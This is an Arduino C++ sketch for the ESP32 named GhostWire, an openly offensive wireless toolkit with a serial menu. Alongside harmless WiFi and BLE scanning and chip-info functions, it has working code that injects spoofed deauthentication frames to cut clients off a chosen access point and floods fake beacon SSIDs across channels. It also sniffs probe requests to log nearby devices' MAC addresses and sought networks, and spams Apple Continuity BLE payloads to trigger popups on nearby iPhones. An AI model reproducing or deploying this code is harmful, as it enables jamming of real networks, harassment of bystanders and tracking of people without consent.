// GhostWire.ino
// ESP32 Wireless Discovery & Offensive Toolkit
// Author: Mayank Malaviya aka AIwolfie

#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <esp_system.h>
#include <esp_chip_info.h>
#include <esp_wifi.h>

// ============================================================
// PROJECT METADATA
// ============================================================
#define GHOSTWIRE_NAME    "GhostWire"
#define GHOSTWIRE_VERSION "2.0.0"
#define GHOSTWIRE_AUTHOR  "Mayank Malaviya aka AIwolfie"
#define GHOSTWIRE_TAGLINE "ESP32 Wireless Discovery & Offensive Toolkit"
#define GHOSTWIRE_BOARD   "ESP32-WROOM"
#define GHOSTWIRE_YEAR    "2026"

// ============================================================
// FORWARD DECLARATIONS
// ============================================================
void printBanner();
void printMenu();
void handleChoice(char c);

// Passive
void wifiScan();
String wifiSecurity(wifi_auth_mode_t type);
void bleScan(int seconds);
void chipInfo();
void memFlashInfo();
void credits();
void systemStatus();
void initBLE();

// Offensive
void selectTarget();
void deauthAttack();
void beaconSpam();
void probeSniffer();
void bleSpam();

// Helpers
void randomMAC(uint8_t* mac);
void buildDeauthFrame(uint8_t* frame, uint8_t* bssid, uint8_t* target);
void buildBeaconFrame(uint8_t* buf, int* len, const char* ssid, uint8_t channel, uint8_t* mac);
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);

// ============================================================
// STRUCTS
// ============================================================
struct TargetAP {
  String   ssid;
  uint8_t  bssid[6];
  int32_t  channel;
  int32_t  rssi;
  String   security;
};

// ============================================================
// BLE SCAN CALLBACK
// ============================================================
class GhostBLEScanCallback : public BLEAdvertisedDeviceCallbacks {
private:
  int count = 0;
public:
  void resetCount() { count = 0; }
  int  getCount()   { return count; }
  void onResult(BLEAdvertisedDevice dev) override {
    count++;
    Serial.println();
    Serial.printf("[%02d] %s\n", count, dev.getAddress().toString().c_str());
    Serial.printf("     RSSI : %d dBm\n", dev.getRSSI());
    Serial.printf("     Name : %s\n",
      dev.haveName() && dev.getName().length() > 0 ? dev.getName().c_str() : "Unknown");
    if (dev.haveServiceUUID())
      Serial.printf("     UUID : %s\n", dev.getServiceUUID().toString().c_str());
  }
};

// ============================================================
// GLOBALS
// ============================================================
BLEScan*                pBLEScan       = nullptr;
static GhostBLEScanCallback bleCallback;
static bool             bleInited      = false;

// Offensive state
static TargetAP         scannedAPs[20];
static int              scannedAPCount = 0;
static TargetAP         currentTarget;
static bool             targetSelected = false;
static volatile int     probeCount     = 0;

// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  Serial.setTimeout(5000);
  delay(2000);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  randomSeed(esp_random());

  printBanner();
  printMenu();
}

// ============================================================
// MAIN LOOP
// ============================================================
void loop() {
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    if (input.length() == 0) return;

    char c = toupper(input[0]);
    bool valid = (c >= '0' && c <= '9') || c == 'A' || c == 'B' || c == 'C';

    if (input.length() == 1 && valid) {
      handleChoice(c);
    } else {
      Serial.println();
      Serial.println("[!] Invalid input. Use: 0-9 or A / B / C");
    }

    delay(300);
    printMenu();
  }
  delay(20);
}

// ============================================================
// BANNER
// ============================================================
void printBanner() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                                                      |");
  Serial.println("|                 G H O S T W I R E                   |");
  Serial.println("|                                                      |");
  Serial.println("|     ESP32 Wireless Discovery & Offensive Toolkit     |");
  Serial.println("|                                                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println("|  WiFi  |  BLE  |  Deauth  |  Beacon  |  Probe       |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("  [ SYSTEM ONLINE ]");
  Serial.println();
  Serial.printf("  Device  : %s\n", GHOSTWIRE_BOARD);
  Serial.printf("  Version : %s\n", GHOSTWIRE_VERSION);
  Serial.println("  Serial  : 115200 baud");
  Serial.println();
  Serial.printf("  Created by : %s\n", GHOSTWIRE_AUTHOR);
}

// ============================================================
// MENU
// ============================================================
void printMenu() {
  Serial.println();
  Serial.println("========================================================");
  Serial.println("                      MAIN MENU");
  Serial.println("========================================================");
  Serial.println();
  Serial.println("  PASSIVE");
  Serial.println("    [1] WiFi Network Scan");
  Serial.println("    [2] BLE Scan  (10 seconds)");
  Serial.println("    [3] BLE Scan  (30 seconds)");
  Serial.println("    [4] Chip Information");
  Serial.println("    [5] Memory / Flash Info");
  Serial.println("    [6] Credits");
  Serial.println("    [7] System Status");
  Serial.println("    [0] Show Banner");
  Serial.println();
  Serial.println("  OFFENSIVE");
  Serial.println("    [8] Select Target AP");
  Serial.println("    [9] Deauth Attack");
  Serial.println("    [A] Beacon Spam");
  Serial.println("    [B] Probe Request Sniffer");
  Serial.println("    [C] BLE Spam (Apple proximity)");
  Serial.println();

  if (targetSelected) {
    Serial.println("  --------------------------------------------------------");
    Serial.printf("  [TARGET]  %s\n", currentTarget.ssid.c_str());
    Serial.printf("            %02X:%02X:%02X:%02X:%02X:%02X  CH:%d  %s\n",
      currentTarget.bssid[0], currentTarget.bssid[1], currentTarget.bssid[2],
      currentTarget.bssid[3], currentTarget.bssid[4], currentTarget.bssid[5],
      currentTarget.channel, currentTarget.security.c_str());
    Serial.println("  --------------------------------------------------------");
    Serial.println();
  }

  Serial.println("========================================================");
  Serial.print("  GhostWire > ");
}

// ============================================================
// MENU HANDLER
// ============================================================
void handleChoice(char c) {
  switch (c) {
    case '1': wifiScan();      break;
    case '2': bleScan(10);     break;
    case '3': bleScan(30);     break;
    case '4': chipInfo();      break;
    case '5': memFlashInfo();  break;
    case '6': credits();       break;
    case '7': systemStatus();  break;
    case '0': printBanner();   break;
    case '8': selectTarget();  break;
    case '9': deauthAttack();  break;
    case 'A': beaconSpam();    break;
    case 'B': probeSniffer();  break;
    case 'C': bleSpam();       break;
    default:
      Serial.println("[!] Unknown option.");
      break;
  }
}

// ============================================================
// WIFI SCAN
// ============================================================
void wifiScan() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                 WIFI NETWORK SCAN                    |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Scanning...");

  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, false, false, 300, 0);

  if (n <= 0) {
    Serial.println("[!] No networks found or scan failed.");
    return;
  }

  Serial.printf("[+] Found %d networks\n\n", n);
  Serial.println(" #   SSID                         CH    RSSI      SECURITY");
  Serial.println("-------------------------------------------------------------");

  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<hidden>";
    if (ssid.length() > 28) ssid = ssid.substring(0, 25) + "...";

    char rssiStr[12];
    snprintf(rssiStr, sizeof(rssiStr), "%d dBm", WiFi.RSSI(i));

    Serial.printf("%2d   %-28s %-5d %-9s %s\n",
      i + 1, ssid.c_str(), WiFi.channel(i),
      rssiStr, wifiSecurity(WiFi.encryptionType(i)).c_str()
    );
  }

  Serial.println("-------------------------------------------------------------");
  WiFi.scanDelete();
  Serial.println("[+] Done.");
}

// ============================================================
// WIFI SECURITY STRING
// ============================================================
String wifiSecurity(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:              return "OPEN";
    case WIFI_AUTH_WEP:               return "WEP";
    case WIFI_AUTH_WPA_PSK:           return "WPA";
    case WIFI_AUTH_WPA2_PSK:          return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:   return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:          return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:     return "WPA2/WPA3";
    default:                          return "UNKNOWN";
  }
}

// ============================================================
// BLE INIT
// ============================================================
void initBLE() {
  if (!bleInited) {
    BLEDevice::init("");
    bleInited = true;
  }
  if (pBLEScan == nullptr) {
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(&bleCallback, true);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
  }
}

// ============================================================
// BLE SCAN
// ============================================================
void bleScan(int seconds) {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                   BLE DISCOVERY                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("[*] Duration : %d seconds\n", seconds);
  Serial.println("[*] Active scan — listening...");

  initBLE();
  if (pBLEScan == nullptr) {
    Serial.println("[!] BLE init failed.");
    return;
  }

  bleCallback.resetCount();
  BLEScanResults results = pBLEScan->start(seconds, false);

  Serial.println();
  Serial.println("[+] BLE scan complete.");
  Serial.printf("[+] Devices found : %d\n", results.getCount());
  pBLEScan->clearResults();
}

// ============================================================
// CHIP INFO
// ============================================================
void chipInfo() {
  esp_chip_info_t info;
  esp_chip_info(&info);

  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                 CHIP INFORMATION                     |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();

  Serial.print("Model          : ");
  switch (info.model) {
    case CHIP_ESP32:   Serial.println("ESP32");       break;
    case CHIP_ESP32S2: Serial.println("ESP32-S2");    break;
    case CHIP_ESP32S3: Serial.println("ESP32-S3");    break;
    case CHIP_ESP32C3: Serial.println("ESP32-C3");    break;
    default:           Serial.println("ESP32 (other)"); break;
  }

  Serial.printf("Revision       : %d\n",     info.revision);
  Serial.printf("CPU Cores      : %d\n",     info.cores);
  Serial.printf("CPU Freq       : %u MHz\n", ESP.getCpuFreqMHz());
  Serial.printf("SDK Version    : %s\n",     ESP.getSdkVersion());
  Serial.printf("MAC Address    : %s\n",     WiFi.macAddress().c_str());
  Serial.println();
  Serial.printf("WiFi           : %s\n", (info.features & CHIP_FEATURE_WIFI_BGN) ? "Yes" : "No");
  Serial.printf("Bluetooth      : %s\n", (info.features & CHIP_FEATURE_BT)       ? "Yes" : "No");
  Serial.printf("BLE            : %s\n", (info.features & CHIP_FEATURE_BLE)      ? "Yes" : "No");
  Serial.printf("Emb. Flash     : %s\n", (info.features & CHIP_FEATURE_EMB_FLASH)? "Yes" : "No");
}

// ============================================================
// MEMORY / FLASH INFO
// ============================================================
void memFlashInfo() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|              MEMORY / FLASH STATUS                   |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("Heap Total         : %u KB\n", ESP.getHeapSize()     / 1024);
  Serial.printf("Heap Free          : %u KB\n", ESP.getFreeHeap()     / 1024);
  Serial.printf("Minimum Free Heap  : %u KB\n", ESP.getMinFreeHeap()  / 1024);
  Serial.printf("Largest Free Block : %u KB\n", ESP.getMaxAllocHeap() / 1024);
  Serial.println();

  if (psramFound() && ESP.getPsramSize() > 0) {
    Serial.printf("PSRAM Total        : %u KB\n", ESP.getPsramSize()  / 1024);
    Serial.printf("PSRAM Free         : %u KB\n", ESP.getFreePsram()  / 1024);
  } else {
    Serial.println("PSRAM              : Not available");
  }

  Serial.println();
  Serial.printf("Flash Size         : %u MB\n",  ESP.getFlashChipSize()   / (1024 * 1024));
  Serial.printf("Flash Speed        : %u MHz\n", ESP.getFlashChipSpeed()  / 1000000);
  Serial.printf("Sketch Size        : %u KB\n",  ESP.getSketchSize()      / 1024);
  Serial.printf("Free Sketch Space  : %u KB\n",  ESP.getFreeSketchSpace() / 1024);
  Serial.printf("Uptime             : %lu sec\n", millis() / 1000);
}

// ============================================================
// CREDITS
// ============================================================
void credits() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                    ABOUT GHOSTWIRE                   |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("  %s  v%s\n\n", GHOSTWIRE_NAME, GHOSTWIRE_VERSION);
  Serial.println("  " GHOSTWIRE_TAGLINE);
  Serial.println();
  Serial.printf("  Author    : %s\n", GHOSTWIRE_AUTHOR);
  Serial.printf("  Board     : %s\n", GHOSTWIRE_BOARD);
  Serial.println("  Framework : Arduino");
  Serial.println();
  Serial.printf("  (c) %s %s\n", GHOSTWIRE_YEAR, GHOSTWIRE_AUTHOR);
}

// ============================================================
// SYSTEM STATUS
// ============================================================
void systemStatus() {
  unsigned long ts = millis() / 1000;
  unsigned int h   = ts / 3600;
  unsigned int m   = (ts % 3600) / 60;
  unsigned int s   = ts % 60;

  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                   SYSTEM STATUS                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("Project    : %s v%s\n", GHOSTWIRE_NAME, GHOSTWIRE_VERSION);
  Serial.printf("Author     : %s\n",     GHOSTWIRE_AUTHOR);
  Serial.printf("Platform   : %s\n",     GHOSTWIRE_BOARD);
  Serial.println();
  Serial.printf("WiFi       : %s\n",  (WiFi.getMode() != WIFI_OFF) ? "Ready" : "Offline");
  Serial.printf("BLE Stack  : %s\n",  bleInited ? "Initialized" : "Idle");
  Serial.printf("Target AP  : %s\n",  targetSelected ? currentTarget.ssid.c_str() : "None");
  Serial.printf("Uptime     : %02u:%02u:%02u\n", h, m, s);
  Serial.printf("Free Heap  : %u KB\n", ESP.getFreeHeap()          / 1024);
  Serial.printf("Flash      : %u MB\n", ESP.getFlashChipSize()     / (1024 * 1024));
}

// ============================================================
// RANDOM MAC
// ============================================================
void randomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
  mac[0] &= 0xFE; // clear multicast bit
  mac[0] |= 0x02; // set locally administered bit
}

// ============================================================
// SELECT TARGET AP
// ============================================================
void selectTarget() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                  SELECT TARGET AP                    |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Scanning...");

  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, false, false, 300, 0);

  if (n <= 0) {
    Serial.println("[!] No networks found.");
    return;
  }

  scannedAPCount = (n > 20) ? 20 : n;

  Serial.printf("[+] Found %d networks:\n\n", scannedAPCount);
  Serial.println(" #   SSID                         CH  RSSI     SECURITY");
  Serial.println("------------------------------------------------------------");

  for (int i = 0; i < scannedAPCount; i++) {
    scannedAPs[i].ssid     = WiFi.SSID(i);
    scannedAPs[i].channel  = WiFi.channel(i);
    scannedAPs[i].rssi     = WiFi.RSSI(i);
    scannedAPs[i].security = wifiSecurity(WiFi.encryptionType(i));

    uint8_t* bp = WiFi.BSSID(i);
    if (bp) memcpy(scannedAPs[i].bssid, bp, 6);
    else    memset(scannedAPs[i].bssid, 0,  6);

    String display = scannedAPs[i].ssid.length() == 0 ? "<hidden>" : scannedAPs[i].ssid;
    if (display.length() > 28) display = display.substring(0, 25) + "...";

    Serial.printf("%2d   %-28s %-3d %-8d %s\n",
      i + 1, display.c_str(),
      scannedAPs[i].channel, scannedAPs[i].rssi,
      scannedAPs[i].security.c_str()
    );
  }

  WiFi.scanDelete();
  Serial.println("------------------------------------------------------------");
  Serial.println();
  Serial.printf("[?] Enter target number (1-%d): ", scannedAPCount);

  Serial.setTimeout(20000);
  String sel = Serial.readStringUntil('\n');
  Serial.setTimeout(5000);
  sel.trim();

  int idx = sel.toInt() - 1;
  if (idx < 0 || idx >= scannedAPCount) {
    Serial.println("[!] Invalid selection. Cancelled.");
    return;
  }

  currentTarget  = scannedAPs[idx];
  targetSelected = true;

  Serial.println();
  Serial.println("[+] Target locked:");
  Serial.printf("    SSID     : %s\n", currentTarget.ssid.c_str());
  Serial.printf("    BSSID    : %02X:%02X:%02X:%02X:%02X:%02X\n",
    currentTarget.bssid[0], currentTarget.bssid[1], currentTarget.bssid[2],
    currentTarget.bssid[3], currentTarget.bssid[4], currentTarget.bssid[5]);
  Serial.printf("    Channel  : %d\n",     currentTarget.channel);
  Serial.printf("    RSSI     : %d dBm\n", currentTarget.rssi);
  Serial.printf("    Security : %s\n",     currentTarget.security.c_str());
}

// ============================================================
// BUILD DEAUTH FRAME  (26 bytes)
// Frame Control: Type=Management, Subtype=Deauth (0xC0 0x00)
// ============================================================
void buildDeauthFrame(uint8_t* f, uint8_t* bssid, uint8_t* target) {
  f[0]  = 0xC0; f[1]  = 0x00;   // FC: deauth
  f[2]  = 0x00; f[3]  = 0x00;   // Duration
  memcpy(&f[4],  target, 6);     // DA
  memcpy(&f[10], bssid,  6);     // SA (spoofed as AP)
  memcpy(&f[16], bssid,  6);     // BSSID
  f[22] = 0x00; f[23] = 0x00;   // Seq Control
  f[24] = 0x07; f[25] = 0x00;   // Reason 7: class-3 from non-assoc STA
}

// ============================================================
// DEAUTH ATTACK
// ============================================================
void deauthAttack() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                   DEAUTH ATTACK                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();

  if (!targetSelected) {
    Serial.println("[!] No target selected. Run [8] first.");
    return;
  }

  Serial.printf("[*] Target  : %s\n", currentTarget.ssid.c_str());
  Serial.printf("[*] BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
    currentTarget.bssid[0], currentTarget.bssid[1], currentTarget.bssid[2],
    currentTarget.bssid[3], currentTarget.bssid[4], currentTarget.bssid[5]);
  Serial.printf("[*] Channel : %d\n", currentTarget.channel);
  Serial.println("[*] Injecting deauth frames — send any key + ENTER to stop.");
  Serial.println();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel((uint8_t)currentTarget.channel, WIFI_SECOND_CHAN_NONE);

  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  // AP → all clients
  uint8_t f_ap[26];
  buildDeauthFrame(f_ap, currentTarget.bssid, broadcast);

  // Broadcast client → AP (spoof)
  uint8_t f_sta[26];
  buildDeauthFrame(f_sta, currentTarget.bssid, broadcast);
  memcpy(&f_sta[4],  currentTarget.bssid, 6); // DA = AP
  memcpy(&f_sta[10], broadcast,            6); // SA = spoofed

  long sent         = 0;
  unsigned long tick = millis();

  while (true) {
    esp_wifi_80211_tx(WIFI_IF_STA, f_ap,  sizeof(f_ap),  false);
    esp_wifi_80211_tx(WIFI_IF_STA, f_sta, sizeof(f_sta), false);
    sent += 2;
    delay(2);

    if (millis() - tick > 1000) {
      Serial.printf("\r[>] Frames sent: %ld      ", sent);
      tick = millis();
    }

    if (Serial.available() > 0) {
      Serial.readStringUntil('\n');
      break;
    }
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  Serial.println();
  Serial.println();
  Serial.printf("[+] Deauth stopped. Total frames sent: %ld\n", sent);
}

// ============================================================
// BUILD BEACON FRAME
// ============================================================
void buildBeaconFrame(uint8_t* b, int* len, const char* ssid, uint8_t ch, uint8_t* mac) {
  int ssidLen = strlen(ssid);
  int p = 0;

  // Management header
  b[p++] = 0x80; b[p++] = 0x00;           // FC: Beacon
  b[p++] = 0x00; b[p++] = 0x00;           // Duration
  memset(&b[p], 0xFF, 6); p += 6;          // DA: broadcast
  memcpy(&b[p], mac,   6); p += 6;         // SA
  memcpy(&b[p], mac,   6); p += 6;         // BSSID
  b[p++] = 0x00; b[p++] = 0x00;           // Seq Control

  // Fixed parameters
  uint64_t ts = (uint64_t)micros();
  memcpy(&b[p], &ts, 8); p += 8;           // Timestamp (8 bytes)
  b[p++] = 0x64; b[p++] = 0x00;           // Beacon interval: 100 TU (~102ms)
  b[p++] = 0x31; b[p++] = 0x04;           // Capability: ESS + Privacy

  // SSID IE (tag 0)
  b[p++] = 0x00;
  b[p++] = (uint8_t)ssidLen;
  memcpy(&b[p], ssid, ssidLen); p += ssidLen;

  // Supported Rates IE (tag 1)
  b[p++] = 0x01; b[p++] = 0x08;
  b[p++] = 0x82; b[p++] = 0x84;           // 1, 2 Mbps (basic)
  b[p++] = 0x8B; b[p++] = 0x96;           // 5.5, 11 Mbps (basic)
  b[p++] = 0x24; b[p++] = 0x30;           // 18, 24 Mbps
  b[p++] = 0x48; b[p++] = 0x6C;           // 36, 54 Mbps

  // DS Parameter Set IE (tag 3) — current channel
  b[p++] = 0x03; b[p++] = 0x01;
  b[p++] = ch;

  // TIM IE (tag 5) — minimal
  b[p++] = 0x05; b[p++] = 0x04;
  b[p++] = 0x00; b[p++] = 0x01;
  b[p++] = 0x00; b[p++] = 0x00;

  *len = p;
}

// ============================================================
// BEACON SPAM
// ============================================================
void beaconSpam() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                    BEACON SPAM                       |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Injecting fake SSIDs across channels 1-13...");
  Serial.println("[*] Send any key + ENTER to stop.");
  Serial.println();

  const char* ssids[] = {
    "FBI Surveillance Van #7",
    "NSA_CLANDESTINE_OPS",
    "Not A FBI Van",
    "SkyNet_Global_Ops",
    "Virus.exe",
    "Bill Wi The Science Fi",
    "Abraham Linksys",
    "The LAN Before Time",
    "Silence of the LANs",
    "Pretty Fly For A WiFi",
    "Drop It Like Its Hotspot",
    "Watching You Right Now",
    "TotallyNotAHotspot",
    "Wu-Tang LAN",
    "GhostWire_Hidden",
    "HackersRUs_5G",
    "CIABackdoor001",
    "Loading...",
    "404 Network Not Found",
    "It Hurts When IP"
  };
  const int ssidCount = 20;

  esp_wifi_set_promiscuous(true);

  uint8_t buf[256];
  int     bLen = 0;
  uint8_t mac[6];
  long    sent = 0;
  unsigned long tick = millis();

  while (true) {
    for (int i = 0; i < ssidCount; i++) {
      randomMAC(mac);
      uint8_t ch = (uint8_t)((esp_random() % 13) + 1);
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      buildBeaconFrame(buf, &bLen, ssids[i], ch, mac);
      esp_wifi_80211_tx(WIFI_IF_STA, buf, bLen, false);
      sent++;
      delay(3);

      if (Serial.available() > 0) {
        Serial.readStringUntil('\n');
        goto spam_stop;
      }
    }

    if (millis() - tick > 1000) {
      Serial.printf("\r[>] Beacons sent: %ld     ", sent);
      tick = millis();
    }
  }

spam_stop:
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  Serial.println();
  Serial.println();
  Serial.printf("[+] Beacon spam stopped. Total sent: %ld\n", sent);
}

// ============================================================
// PROBE SNIFFER CALLBACK  (IRAM_ATTR for ISR-safe placement)
// Parses 802.11 management frames, filters probe requests (subtype 4)
// ============================================================
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* f = pkt->payload;

  // Frame control byte 0: bits[3:2] = type, bits[7:4] = subtype
  // Probe Request: type=0b00 (mgmt), subtype=0b0100
  if ((f[0] & 0xFC) != 0x40) return;

  // Src MAC at offset 10-15
  uint8_t* src = &f[10];

  if (pkt->rx_ctrl.sig_len < 26) return;

  // SSID IE: offset 24 = tag number (0x00), offset 25 = length
  if (f[24] != 0x00) return;

  uint8_t tagLen = f[25];
  char    ssidStr[33] = "<wildcard>";

  if (tagLen > 0 && tagLen <= 32) {
    memcpy(ssidStr, &f[26], tagLen);
    ssidStr[tagLen] = '\0';
  }

  Serial.printf("[PROBE] %02X:%02X:%02X:%02X:%02X:%02X  ->  \"%-32s\"  %d dBm\n",
    src[0], src[1], src[2], src[3], src[4], src[5],
    ssidStr, pkt->rx_ctrl.rssi);

  probeCount++;
}

// ============================================================
// PROBE REQUEST SNIFFER
// ============================================================
void probeSniffer() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|               PROBE REQUEST SNIFFER                  |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Enabling promiscuous mode with channel hopping...");
  Serial.println("[*] Capturing 802.11 probe request frames.");
  Serial.println("[*] Send any key + ENTER to stop.");
  Serial.println();
  Serial.println("  SOURCE MAC              PROBED SSID                     RSSI");
  Serial.println("  ------------------------------------------------------------------");

  probeCount = 0;

  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);

  uint8_t       ch   = 1;
  unsigned long tick = millis();

  while (true) {
    // Hop to next channel every 200ms
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch = (ch % 13) + 1;
    delay(200);

    if (millis() - tick > 5000) {
      Serial.printf("\n  [*] Probes captured: %d\n", probeCount);
      tick = millis();
    }

    if (Serial.available() > 0) {
      Serial.readStringUntil('\n');
      break;
    }
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  Serial.println();
  Serial.println("  ------------------------------------------------------------------");
  Serial.printf("[+] Sniffer stopped. Total probes: %d\n", probeCount);
}

// ============================================================
// BLE SPAM  —  Apple Continuity Protocol proximity payloads
// Triggers "Connect" popup notifications on nearby iOS/macOS devices
// ============================================================
void bleSpam() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|             BLE SPAM (Apple Proximity)                |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Cycling Apple proximity pairing advertisements...");
  Serial.println("[*] Triggers popup notifications on nearby Apple devices.");
  Serial.println("[*] Send any key + ENTER to stop.");
  Serial.println();

  if (!bleInited) {
    BLEDevice::init("");
    bleInited = true;
  }

  // Apple Continuity Protocol — manufacturer data (company ID 0x004C, LE byte order)
  // Layout: 0x4C 0x00 | type(1) | length(1) | payload(N)
  struct ApplePayload {
    const char* label;
    uint8_t     data[27];
    uint8_t     len;
  };

  static const ApplePayload payloads[] = {
    {
      "AirPods",
      {0x4C,0x00, 0x07,0x19, 0x07,0x02,0x20,0x75,
       0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
       0x00,0x00,0x00},
      27
    },
    {
      "AirPods Pro",
      {0x4C,0x00, 0x07,0x19, 0x0E,0x20,0x75,0xAA,
       0x30,0x01,0x00,0x45,0x12,0x12,0x12,0x00,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
       0x00,0x00,0x00},
      27
    },
    {
      "AirPods Max",
      {0x4C,0x00, 0x07,0x19, 0x0A,0x20,0x75,0xAA,
       0x30,0x01,0x00,0x45,0x12,0x12,0x12,0x00,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
       0x00,0x00,0x00},
      27
    },
    {
      "Beats Studio",
      {0x4C,0x00, 0x07,0x19, 0x09,0x20,0x75,0xAA,
       0x30,0x01,0x00,0x45,0x12,0x12,0x12,0x00,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
       0x00,0x00,0x00},
      27
    },
    {
      "Apple TV",
      {0x4C,0x00, 0x07,0x19, 0x0B,0x20,0x75,0xAA,
       0x30,0x01,0x00,0x45,0x12,0x12,0x12,0x00,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
       0x00,0x00,0x00},
      27
    }
  };
  const int payloadCount = 5;

  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  long sent = 0;
  int  idx  = 0;

  while (true) {
    pAdv->stop();

    BLEAdvertisementData advData;
    std::string mfgData((const char*)payloads[idx].data, payloads[idx].len);
    advData.setManufacturerData(mfgData);
    pAdv->setAdvertisementData(advData);
    pAdv->start();

    Serial.printf("\r[>] Spamming: %-14s  |  Sent: %ld     ",
      payloads[idx].label, sent);

    idx = (idx + 1) % payloadCount;
    sent++;
    delay(150);

    if (Serial.available() > 0) {
      Serial.readStringUntil('\n');
      break;
    }
  }

  pAdv->stop();
  Serial.println();
  Serial.println();
  Serial.printf("[+] BLE spam stopped. Total advertisements: %ld\n", sent);
}